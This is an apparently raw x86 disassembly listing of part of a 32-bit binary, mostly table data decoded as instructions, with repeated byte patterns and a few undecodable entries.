  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [ecx+edi*1+0x3],dl
  412427:	add    BYTE PTR [ecx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
